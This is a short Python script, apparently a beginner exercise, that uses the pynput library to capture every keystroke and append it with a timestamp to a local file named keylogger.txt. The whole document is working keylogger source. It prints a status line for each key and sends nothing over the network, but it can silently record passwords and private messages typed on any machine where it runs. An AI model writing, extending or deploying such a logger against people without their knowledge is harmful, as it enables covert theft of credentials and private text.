from pynput import keyboard
import datetime 

isStarted=False

def keyPressed(key):
    global isStarted
    if  isStarted == False:
        cur=datetime.datetime.now()
        with open ("keylogger.txt" , "a") as file1:
             cur_time=datetime.datetime.now()
             cur=cur_time.strftime("%D-%H:%M:%S")
             file1.write("\n")
             file1.write(f"{cur}\t")

        isStarted=True

    with open ("keylogger.txt" , "a") as file1:
        try:
            char=key.char
            file1.write(char)
            print("Key event has been stored successfully")
        except:
            print("\nFailed to record key event")

if __name__ =="__main__":

    listener=keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
        